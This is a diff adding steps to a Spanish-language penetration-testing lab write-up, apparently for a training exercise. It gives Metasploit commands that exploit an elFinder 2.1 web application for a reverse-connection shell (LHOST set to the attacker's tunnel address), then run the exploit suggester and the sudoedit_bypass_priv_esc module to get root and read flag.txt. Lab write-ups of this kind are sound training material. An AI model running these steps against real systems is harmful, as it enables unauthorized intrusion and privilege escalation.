@@ -294,6 +294,91 @@ Profundizamos el escaneo, para obtener más información, puntualmente escaneamo
 ```bash
 db_nmap -Pn -n --disable-arp-ping --reason -p22,80 -sV -sC --script=vuln -O <ip>
 ```
- 
 
+ Mejor es hacer directamente:
+ ```bash
+db_nmap -Pn -n --disable-arp-ping --reason -p80 -sV -sC <ip>
+```
+<img width="1603" height="324" alt="image" src="https://github.com/user-attachments/assets/dac1a8f5-5687-482a-9fd2-997d70053e99" />
+
+
+---
+
+# Encuentra el exploit existente en MSF y úsalo para obtener acceso al sistema objetivo. ¿Cuál es el nombre de usuario del usuario con el que obtuviste acceso?
+
+Si hacemos vulns -p 80 vemos todos los CVE que en este caso, fueron obtenidos por el escaneo de nmap sobre el puerto 80, que en su mayoría deben ser de apache:
+<img width="1882" height="762" alt="image" src="https://github.com/user-attachments/assets/dc2e996d-256f-4f40-b3e4-cd8d22d487d8" />
+
+Buscamos manualmente los CVE que aparecen:
+```bash
+search cve:xxxx-xxxx
+```
+
+No se encuentran los exploits correspondientes a estos CVE, que en su mayoría deben ser de apache..
+
+Entonces busquemos por elFinder:
+
+<img width="1505" height="296" alt="image" src="https://github.com/user-attachments/assets/73f16ff4-bcd4-45fc-b9b9-d1265626c03e" />
+
+Buscamos:
+```bash
+search "elfinder 2.1" type:exploit
+```
+
+<img width="1910" height="449" alt="image" src="https://github.com/user-attachments/assets/f82d2844-896c-4b9a-81c4-1d570fad775a" />
+
+Ponemos `use 0` y configuramos:
+
+```bash
+set LHOST <ip_tun0>
+hosts -R
+check
+exploit
+```
+<img width="1675" height="716" alt="image" src="https://github.com/user-attachments/assets/5dacb76c-9ef0-4776-804e-39622b3c654a" />
+
+Hacemos `getuid`:
+<img width="443" height="107" alt="image" src="https://github.com/user-attachments/assets/16727aec-5201-4881-a6a2-d8b597d78ac5" />
+
+
+---
+
+
+#### El sistema objetivo tiene una versión antigua de Sudo en ejecución. Encuentra la vulnerabilidad correspondiente y obtén acceso de superusuario al sistema objetivo. Encuentra el archivo flag.txt y envía su contenido como respuesta.
+
+
+Enviamos la sesión a background:
+
+<img width="1029" height="88" alt="image" src="https://github.com/user-attachments/assets/2e0b75ae-f64b-4b3f-a020-37fad42a17f8" />
+
+Buscamos el módulo post `exploit suggester`:
+```bash
+search suggester type:post platform:linux
+```
+
+<img width="1728" height="371" alt="image" src="https://github.com/user-attachments/assets/ac8ffb1d-6c14-449a-8f0b-2161bb760d4a" />
+
+```bash
+use 0
+options
+sessions -l
+set sessions <id>
+```
+<img width="1621" height="323" alt="image" src="https://github.com/user-attachments/assets/92fdd082-c368-4d61-a2dd-5670cc5d2737" />
+
+Corremos el módulo con `run`:
+<img width="1912" height="790" alt="image" src="https://github.com/user-attachments/assets/9a8db80d-196d-4c9d-8855-b6bb9606281d" />
+
+Vemos el módulo `exploit/linux/local/sudoedit_bypass_priv_esc`, procedemos a utilizarlo:
+
+```bash
+back
+use exploit/linux/local/sudoedit_bypass_priv_esc
+options
+sessions -l
+set session <id>
+exploit
+```
+
+<img width="1918" height="278" alt="image" src="https://github.com/user-attachments/assets/64e8c81d-bc5b-4657-b5bb-13b0f48c4ba5" />
 
